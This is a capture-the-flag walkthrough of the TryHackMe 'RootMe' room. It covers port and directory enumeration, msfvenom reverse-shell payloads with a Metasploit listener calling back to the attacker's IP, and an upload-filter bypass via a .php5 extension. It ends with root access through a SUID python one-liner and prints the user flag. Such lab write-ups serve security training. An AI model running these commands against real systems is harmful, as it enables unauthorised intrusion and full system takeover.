# RootMe

[RootMe](https://tryhackme.com/room/rrootme)

## Enumeration

### Nmap

```bash
nmap -A ip_address

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 cf4c930a94d2dc57eeb8de8bce4aa91c (RSA)
|   256 c30c8a6f271265a2056c1ae9ccc55c49 (ECDSA)
|_  256 f016a097e0212bce2cf74880294ec1ab (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

### Directory Brute force

```bash
gobuster dir -u http://10.10.209.46:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

```bash
/uploads              (Status: 301) [Size: 314] [--> http://10.10.209.46/uploads/]                                                                            
/css                  (Status: 301) [Size: 310] [--> http://10.10.209.46/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.209.46/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.209.46/panel/]                                                                 
/server-status        (Status: 403) [Size: 277]
```

## Getting a Shell - Find a form to upload and get a reverse shell, and find the flag

### Creating MSFVenom PHP Payload

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.231.56 LPORT=9001 -f elf -o reverse.elf
```

### Creating Meterpreter Listener with MSF console

```bash
msfconsole -q -x "use multi/handler; set payload php/reverse_php; set lhost 10.10.231.56; set lport 9001; exploit"
```

### Upload the payload on the webpage's upload tab

![Upload attempt](attachment:efaacaea-2b6e-4959-9470-73eddcc94e22:image.png)

If we browse to the **ip_address/uploads** folder, we can see that it has been uploaded

![Uploads folder](attachment:111dcf71-62b6-4e94-a5c9-cf0ba832657f:image.png)

Seems like i made a mistake, the PHP payload was the way to upload, but instead i uploaded an .elf for Linux machine, but in fact we needed the PHP.

So i recreated the PHP payload, changed the extension to php5, to bypass the security measure and it was successfully uploaded to the webserver

![Successful upload](attachment:e9672f11-dd62-4f64-a592-d1f6fb63f76c:image.png)

Now lets browse to the upload directory and try to trigger the payload to get a shell

![Trigger payload](attachment:65d5ed2c-1c48-4017-8609-75122b53e568:image.png)

Had to change plans again, as this was not working. Generated a new PHP payload with the PHP monkey GitHub tool and did the same process above and this time i utilized netcat for the listener

![Shell obtained](attachment:ac61b072-2a53-4efa-a09a-8d012f62a8f1:image.png)

I think this time it works, because the shell is active

### Quickly search for the user.txt

```bash
find / -name "user.txt" 2>/dev/null
```

Result:

```bash
/var/www/user.txt
```

Now, lets view this file, finally:

```bash
$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

## Search for files with SUID permission, which file is weird?

### Finding files with SUID Permissions Owned by Root

```bash
find / -type f -user root -perm -4000 2>/dev/null
```

We identified that **/usr/bin/python** is the weird file

### Lets escalate privileges to Root

1. Go to GTFOBins

![GTFOBins](attachment:75853d99-4f8a-4c4a-8167-ae9c374037d2:image.png)

2. Search for Python, to find the libraries for that
   - We have identified the Sudo python binary

![Python SUID](attachment:33676103-3dc9-43d6-976b-6f0529b50483:image.png)

3. We will use this payload to try and escalate our privilege in our current environment:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

4. After running, our privileges will be escalated

![Root access](attachment:2e51a097-8f10-4b37-82cd-1dc26406230f:image.png)

### Find the Root File

```bash
find / -name "root.txt" 2>/dev/null
```

It will be in /root/root.txt

---

![Completed](attachment:02b235ce-a8ab-475b-98ae-e3dbb89376c1:image.png)
